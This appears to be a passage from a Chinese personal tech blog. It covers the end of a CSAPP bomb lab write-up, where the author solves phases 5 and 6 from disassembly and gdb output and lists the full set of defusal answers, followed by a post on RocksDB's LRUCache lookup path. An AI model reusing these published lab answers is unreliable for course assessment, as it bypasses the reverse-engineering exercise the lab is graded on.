<p>这个数组一共有 16 位，数组中的元素为 <code>&#123;10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5&#125;</code>。<br>接下来的汇编代码表示一个循环，寄存器 <code>%edx</code> 初值定为 0，每次循环加 1，根据后面 <code>cmp 0xf, %edx</code> 可以得出，循环必须执行 15 次；同时ecx寄存器不断的累加数，每次把一个数的值存到 <code>%eax</code> 寄存器中，并且作为下次取值的索引，即对于每对索引 <code>i</code> 和值 <code>v</code> 而言，下一个 <code>v&#39;</code> 位于索引 <code>v</code> 处，相当于构成了一个环形链表。另外，传入的第一个参数不能为 15，并且在遍历过程中，根据 <code>cmp $0xf,%eax</code>，<code>%eax</code> 也不能等于15。索引 15 对应的值为 5， 因此，传入的第一个参数必须是 5，累加循环从索引 5 对应的值开始，这样才能保证能够循环 15 次，对 15 个遍历到的值进行累加，累加和为 <code>(0 + 15) * 16 / 2 -5 = 115</code>。<br>因此，第五关答案为 <code>5 115</code>。</p>
<h2 id="bomb-6"><a href="#bomb-6" class="headerlink" title="bomb 6"></a>bomb 6</h2><p><code>phase_6</code> 汇编代码太多，需要花费一定的时间。<br>首先，进入函数做一些初始化的工作后，根据 <code>jmpq 177a &lt;phase_6+0xe1&gt;</code> ，函数会跳转到 <code>177a</code> 处执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">175d:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">1761:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line">1764:	7f 0c                	jg     1772 &lt;phase_6+0xd9&gt;</span><br><span class="line">1766:	41 8b 44 9d 00       	mov    0x0(%r13,%rbx,4),%eax</span><br><span class="line">176b:	39 45 00             	cmp    %eax,0x0(%rbp)</span><br><span class="line">176e:	75 ed                	jne    175d &lt;phase_6+0xc4&gt;</span><br><span class="line">1770:	eb e6                	jmp    1758 &lt;phase_6+0xbf&gt;</span><br><span class="line">1772:	49 83 c7 01          	add    $0x1,%r15</span><br><span class="line">1776:	49 83 c6 04          	add    $0x4,%r14</span><br><span class="line">177a:	4c 89 f5             	mov    %r14,%rbp</span><br><span class="line">177d:	41 8b 06             	mov    (%r14),%eax</span><br><span class="line">1780:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line">1783:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">1786:	0f 87 47 ff ff ff    	ja     16d3 &lt;phase_6+0x3a&gt;</span><br><span class="line">178c:	49 83 ff 06          	cmp    $0x6,%r15</span><br><span class="line">1790:	0f 84 47 ff ff ff    	je     16dd &lt;phase_6+0x44&gt;</span><br><span class="line">1796:	4c 89 fb             	mov    %r15,%rbx</span><br><span class="line">1799:	eb cb                	jmp    1766 &lt;phase_6+0xcd&gt;</span><br></pre></td></tr></table></figure>
<p>从 <code>177a</code> 处开始看起，首先会判断传入的第一个参数减 1 后是否大于 5，也就是这里需要保证参数不能超过 6。之后跳入 <code>1766</code> 处执行，<code>1766</code> -&gt; <code>176e</code> -&gt; <code>175d</code> -&gt; <code>1766</code> 构成了一个循环，判断当前参数的后面几个参数是否与当前参数相等，相等则炸弹爆炸。 然后跳到 <code>1772</code> 处执行，判断第二个参数减 1 后是否大于 5……即整个这一部分代码是一个大循环，来保证 6 个参数不大于 6，并且各不相等。<br>接下来，函数会跳到 <code>16dd</code> 处执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">16dd:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi</span><br><span class="line">16e2:	49 8d 7c 24 18       	lea    0x18(%r12),%rdi</span><br><span class="line">16e7:	41 8b 0c 24          	mov    (%r12),%ecx</span><br><span class="line">16eb:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">16f0:	48 8d 15 19 3b 00 00 	lea    0x3b19(%rip),%rdx        # 5210 &lt;node1&gt;</span><br><span class="line">16f7:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line">16fa:	7e 0b                	jle    1707 &lt;phase_6+0x6e&gt;</span><br><span class="line">16fc:	48 8b 52 08          	mov    0x8(%rdx),%rdx</span><br><span class="line">1700:	83 c0 01             	add    $0x1,%eax</span><br><span class="line">1703:	39 c8                	cmp    %ecx,%eax</span><br><span class="line">1705:	75 f5                	jne    16fc &lt;phase_6+0x63&gt;</span><br><span class="line">1707:	48 89 16             	mov    %rdx,(%rsi)</span><br><span class="line">170a:	49 83 c4 04          	add    $0x4,%r12</span><br><span class="line">170e:	48 83 c6 08          	add    $0x8,%rsi</span><br><span class="line">1712:	4c 39 e7             	cmp    %r12,%rdi</span><br><span class="line">1715:	75 d0                	jne    16e7 &lt;phase_6+0x4e&gt;</span><br></pre></td></tr></table></figure>
<p>我们输入的参数数组存放在 <code>%r12</code> 中，根据 <code>lea 0x18(%r12),%rdi</code> 可以得出，<code>%rdi</code> 存放了数组的结束地址。这段代码做的就是根据我们输入的参数将 <code>node</code> 按照顺序放入栈中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for(int i &#x3D; 0; i &lt; 6; i++)</span><br><span class="line">&#123;</span><br><span class="line">    %rdx &#x3D; 0x3b19(%rip);</span><br><span class="line">    for(int j &#x3D; 0; j &lt; arr[i]; j++)</span><br><span class="line">        %rdx &#x3D; addr + 0x8;</span><br><span class="line">    %rsi &#x3D; *%rdx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再看之后的代码，将 <code>%rax</code> 指向 <code>%rbx</code> 下一个链表节点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1717:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx</span><br><span class="line">171c:	48 8b 44 24 28       	mov    0x28(%rsp),%rax</span><br><span class="line">1721:	48 89 43 08          	mov    %rax,0x8(%rbx)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>最后，比较链表节点中第一个字段值的大小，如果前一个节点值小于后一个节点值，炸弹爆炸：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">179b:	48 8b 5b 08          	mov    0x8(%rbx),%rbx</span><br><span class="line">179f:	83 ed 01             	sub    $0x1,%ebp</span><br><span class="line">17a2:	74 11                	je     17b5 &lt;phase_6+0x11c&gt;</span><br><span class="line">17a4:	48 8b 43 08          	mov    0x8(%rbx),%rax</span><br><span class="line">17a8:	8b 00                	mov    (%rax),%eax</span><br><span class="line">17aa:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">17ac:	7d ed                	jge    179b &lt;phase_6+0x102&gt;</span><br><span class="line">17ae:	e8 68 02 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>在此我们知道数据是根据每个节点中的第一个数升序排列。<br>所以只需要查看初始链表存储的数据即可得出答案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r rdx</span><br><span class="line">rdx            0x8005210        134238736</span><br><span class="line">(gdb) p *134238736</span><br><span class="line">$1 &#x3D; 581</span><br><span class="line">(gdb) p *134238752</span><br><span class="line">$2 &#x3D; 563</span><br><span class="line">(gdb) p *134238768</span><br><span class="line">$3 &#x3D; 687</span><br><span class="line">(gdb) p *134238784</span><br><span class="line">$4 &#x3D; 154</span><br><span class="line">(gdb) p *134238800</span><br><span class="line">$5 &#x3D; 170</span><br><span class="line">(gdb) p *134238808</span><br><span class="line">$6 &#x3D; 134238480</span><br><span class="line">(gdb) p *134238480</span><br><span class="line">$7 &#x3D; 454</span><br></pre></td></tr></table></figure>
<p>链表节点的值为 <code>581 563 687 154 170 454</code>，由大到小排序的节点编号 <code>3 1 2 6 5 4</code> 即为第六关答案。</p>
<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hey-kong@LAPTOP-9010T96A:&#x2F;mnt&#x2F;c&#x2F;ubuntu&#x2F;csapp&#x2F;bomb65$ .&#x2F;bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">I am just a renegade hockey mom.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">0 1 1 2 3 5</span><br><span class="line">That&#39;s number 2.  Keep going!</span><br><span class="line">1 171</span><br><span class="line">Halfway there!</span><br><span class="line">13 3</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">5 115</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">3 1 2 6 5 4</span><br><span class="line">Congratulations! You&#39;ve defused the bomb!</span><br></pre></td></tr></table></figure>
<h2 id="repo"><a href="#repo" class="headerlink" title="repo"></a>repo</h2><p><a target="_blank" rel="noopener" href="https://github.com/hey-kong/csapp">My solutions to CSAPP labs</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-18T07:21:39.000Z" title="2021-1-18 15:21:39">2021-01-18</time>发表</span><span class="level-item"><time dateTime="2021-01-18T15:38:25.791Z" title="2021-1-18 23:38:25">2021-01-18</time>更新</span><span class="level-item">7 分钟读完 (大约1065个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/18/Rocksdb-Cache/">从 Row Cache 的 Get 来看 Rocksdb LRUCache</a></h1><div class="content"><p><code>本文简单介绍 RocksDB 6.7.3 版本的 LRUCache。</code></p>
<h2 id="Row-Cache"><a href="#Row-Cache" class="headerlink" title="Row Cache"></a>Row Cache</h2><p>Row Cache 对查找的 key 在 SST 中对应的 value 进行 cache。如果 row_cache 打开，在 TableCache::Get 函数中，会调用 CreateRowCacheKeyPrefix 和 GetFromRowCache 获取 row cache 的 key（fd_number + seq_no + user_key），在 GetFromRowCache 中，会调用 row_cache-&gt;Lookup，得到 row cache 缓存的 row_handle，构造 found_row_cache_entry 指针指向 value，利用 Cleannable 类的特性，可以通过减少一次对 value 内存拷贝的方式来获取最终的结果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Status TableCache::Get(const ReadOptions&amp; options,</span><br><span class="line">                       const InternalKeyComparator&amp; internal_comparator,</span><br><span class="line">                       const FileMetaData&amp; file_meta, const Slice&amp; k,</span><br><span class="line">                       GetContext* get_context,</span><br><span class="line">                       const SliceTransform* prefix_extractor,</span><br><span class="line">                       HistogramImpl* file_read_hist, bool skip_filters,</span><br><span class="line">                       int level) &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (ioptions_.row_cache &amp;&amp; !get_context-&gt;NeedToReadSequence()) &#123;</span><br><span class="line">    auto user_key = ExtractUserKey(k);</span><br><span class="line">    CreateRowCacheKeyPrefix(options, fd, k, get_context, row_cache_key);</span><br><span class="line">    <span class="keyword">done</span> = GetFromRowCache(user_key, row_cache_key, row_cache_key.Size(),</span><br><span class="line">                           get_context);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">done</span>) &#123;</span><br><span class="line">      row_cache_entry = &amp;row_cache_entry_buffer;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void TableCache::CreateRowCacheKeyPrefix(const ReadOptions&amp; options,</span><br><span class="line">                                         const FileDescriptor&amp; fd,</span><br><span class="line">                                         const Slice&amp; internal_key,</span><br><span class="line">                                         GetContext* get_context,</span><br><span class="line">                                         IterKey&amp; row_cache_key) &#123;</span><br><span class="line">  uint64_t fd_number = fd.GetNumber();</span><br><span class="line">  uint64_t seq_no = 0;</span><br><span class="line">  ...</span><br><span class="line">  AppendVarint64(&amp;row_cache_key, fd_number);</span><br><span class="line">  AppendVarint64(&amp;row_cache_key, seq_no);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool TableCache::GetFromRowCache(const Slice&amp; user_key, IterKey&amp; row_cache_key,</span><br><span class="line">                                 size_t prefix_size, GetContext* get_context) &#123;</span><br><span class="line">  bool found = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  row_cache_key.TrimAppend(prefix_size, user_key.data(), user_key.size());</span><br><span class="line">  <span class="keyword">if</span> (auto row_handle =</span><br><span class="line">          ioptions_.row_cache-&gt;Lookup(row_cache_key.GetUserKey())) &#123;</span><br><span class="line">    // Cleanable routine to release the cache entry</span><br><span class="line">    Cleanable value_pinner;</span><br><span class="line">    auto release_cache_entry_func = [](void* cache_to_clean,</span><br><span class="line">                                       void* cache_handle) &#123;</span><br><span class="line">      ((Cache*)cache_to_clean)-&gt;Release((Cache::Handle*)cache_handle);</span><br><span class="line">    &#125;;</span><br><span class="line">    auto found_row_cache_entry =</span><br><span class="line">        static_cast&lt;const std::string*&gt;(ioptions_.row_cache-&gt;Value(row_handle));</span><br><span class="line">    // If it comes here value is located on the cache.</span><br><span class="line">    // found_row_cache_entry points to the value on cache,</span><br><span class="line">    // and value_pinner has cleanup procedure <span class="keyword">for</span> the cached entry.</span><br><span class="line">    // After replayGetContextLog() returns, get_context.pinnable_slice_</span><br><span class="line">    // will point to cache entry buffer (or a copy based on that) and</span><br><span class="line">    // cleanup routine under value_pinner will be delegated to</span><br><span class="line">    // get_context.pinnable_slice_. Cache entry is released when</span><br><span class="line">    // get_context.pinnable_slice_ is reset.</span><br><span class="line">    value_pinner.RegisterCleanup(release_cache_entry_func,</span><br><span class="line">                                 ioptions_.row_cache.get(), row_handle);</span><br><span class="line">    replayGetContextLog(*found_row_cache_entry, user_key, get_context,</span><br><span class="line">                        &amp;value_pinner);</span><br><span class="line">    RecordTick(ioptions_.statistics, ROW_CACHE_HIT);</span><br><span class="line">    found = <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    RecordTick(ioptions_.statistics, ROW_CACHE_MISS);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> found;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="LRUCache-类"><a href="#LRUCache-类" class="headerlink" title="LRUCache 类"></a>LRUCache 类</h2><img src="/2021/01/18/Rocksdb-Cache/rocksdb_cache.png" style="zoom:100%;">

<ul>
<li><p>Cache<br>定义了 Cache 的接口，包括 Insert, Lookup, Release 等操作。</p>
</li>
<li><p>ShardedCache<br>支持对 Cache 进行分桶，分桶数量为 2^num_shard_bits，每个桶的容量相等。分桶的依据是取 key 的 hash 值的高 num_shard_bits 位。</p>
</li>
<li><p>LRUCache<br>实现了 ShardedCache，维护了一个 LRUCacheShard 数组，一个 shard 就是一个桶。</p>
</li>
<li><p>CacheShard<br>定义了一个桶的接口，包括 Insert, Lookup, Release 等操作，Cache 的相关调用经过分桶处理后，都会调用指定桶的对应操作。</p>
</li>
<li><p>LRUCacheShard<br>实现了 CacheShard，维护了一个 LRU list 和 hash table，用来实现 LRU 策略，他们的成员类型都是 LRUHandle。</p>
</li>
<li><p>LRUHandle<br>保存 key 和 value 的单元，并且包含前向和后续指针，可以组成双向循环链表作为 LRU list。</p>
</li>
<li><p>LRUHandleTable<br>hash table 的实现，根据 key 再次做了分组处理，并且尽量保证每个桶中只有一个元素，元素类型为 LRUHandle。提供了Lookup, Insert, Remove操作。</p>
</li>
</ul>
<h2 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h2><p>在 GetFromRowCache 中，会调用 row_cache-&gt;Lookup，这里实际调用的是 ShardedCache::Lookup</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cache::Handle* ShardedCache::Lookup(const Slice&amp; key, Statistics* /*stats*/) &#123;</span><br><span class="line">  uint32_t <span class="built_in">hash</span> = HashSlice(key);</span><br><span class="line">  <span class="built_in">return</span> GetShard(Shard(<span class="built_in">hash</span>))-&gt;Lookup(key, <span class="built_in">hash</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取哈希值，根据 hash 值的高 num_shard_bits 位获取 shard，再调用 LRUCacheShard::Lookup</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Cache::Handle* LRUCacheShard::Lookup(const Slice&amp; key, uint32_t <span class="built_in">hash</span>) &#123;</span><br><span class="line">  MutexLock l(&amp;mutex_);</span><br><span class="line">  LRUHandle* e = table_.Lookup(key, <span class="built_in">hash</span>);</span><br><span class="line">  <span class="keyword">if</span> (e != nullptr) &#123;</span><br><span class="line">    assert(e-&gt;InCache());</span><br><span class="line">    <span class="keyword">if</span> (!e-&gt;HasRefs()) &#123;</span><br><span class="line">      // The entry is <span class="keyword">in</span> LRU since it<span class="string">&#x27;s in hash and has no external references</span></span><br><span class="line"><span class="string">      LRU_Remove(e);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    e-&gt;Ref();</span></span><br><span class="line"><span class="string">    e-&gt;SetHit();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  return reinterpret_cast&lt;Cache::Handle*&gt;(e);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>LRUCacheShard::Lookup 中又会调用 LRUHandleTable::Lookup，在 FindPointer 中，hash 到特定位置后，如果当前位置的 hash 和当前 hash 不一样，或者 key 不一样，并且指针也不为空，则继续向下找，直到找到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LRUHandle* LRUHandleTable::Lookup(const Slice&amp; key, uint32_t <span class="built_in">hash</span>) &#123;</span><br><span class="line">  <span class="built_in">return</span> *FindPointer(key, <span class="built_in">hash</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRUHandle** LRUHandleTable::FindPointer(const Slice&amp; key, uint32_t <span class="built_in">hash</span>) &#123;</span><br><span class="line">  LRUHandle** ptr = &amp;list_[<span class="built_in">hash</span> &amp; (length_ - 1)];</span><br><span class="line">  <span class="keyword">while</span> (*ptr != nullptr &amp;&amp; ((*ptr)-&gt;<span class="built_in">hash</span> != <span class="built_in">hash</span> || key != (*ptr)-&gt;key())) &#123;</span><br><span class="line">    ptr = &amp;(*ptr)-&gt;next_hash;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>LRUCache 就是把多个 LRUCacheShard 组合起来，每个 LRUCacheShard 维护了一个 LRUHandle list 和 hash table，LRUHandleTable 用拉链法实现哈希表。通过对缓存的 Lookup 调用链分析可以看到具体的实现非常简练。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a target="_blank" rel="noopener" href="https://github.com/facebook/rocksdb/tree/v6.7.3">Rocksdb Source Code 6.7.3</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/75b93a664ebe?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">RocksDB. LRUCache源码分析</a></li>
<li><a target="_blank" rel="noopener" href="https://www.yuanguohuo.com/2018/12/23/rocksdb-cache/">RocksDB中的LRUCache</a></li>
</ol>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">上一页</a></div><div class="pagination-next"><a href="/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/dog.png" alt="Iggie Wang (王亮)"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Iggie Wang (王亮)</p><p class="is-size-6 is-block">CS, Wuhan University</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Wuhan, China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">12</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/hey-kong" target="_blank" rel="noopener">关注我</a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://github.com/hey-kong" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Github</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li><li><a class="level is-mobile" href="iggiewang@gmail.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Email</span></span><span class="level-right"><span class="level-item tag">iggiewang@gmail.com</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-21T08:28:03.000Z">2021-02-21</time></p><p class="title"><a href="/2021/02/21/%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1/">缓存设计</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-20T13:00:00.000Z">2021-02-20</time></p><p class="title"><a href="/2021/02/20/Go%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E7%BC%BA%E9%99%B7/">Go语言开发的优势与缺陷</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-16T03:53:12.000Z">2021-02-16</time></p><p class="title"><a href="/2021/02/16/TiDB-%E6%9E%B6%E6%9E%84/">TiDB 架构</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-13T01:00:00.000Z">2021-02-13</time></p><p class="title"><a href="/2021/02/13/Online-Asynchronous-Schema-Change-in-F1/">Online, Asynchronous Schema Change in F1</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-08T16:00:00.000Z">2021-02-09</time></p><p class="title"><a href="/2021/02/09/Google-Percolator/">Google Percolator</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CSAPP/"><span class="tag">CSAPP</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cache/"><span class="tag">Cache</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Database/"><span class="tag">Database</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/File-System/"><span class="tag">File System</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Go/"><span class="tag">Go</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Rocksdb/"><span class="tag">Rocksdb</span><span class="tag">2</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">Iggie Wang&#039;s Cyberspace</a><p class="is-size-7"><span>&copy; 2021 王亮</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><a class="is-block mb-2" target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备2021001315号</a></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script 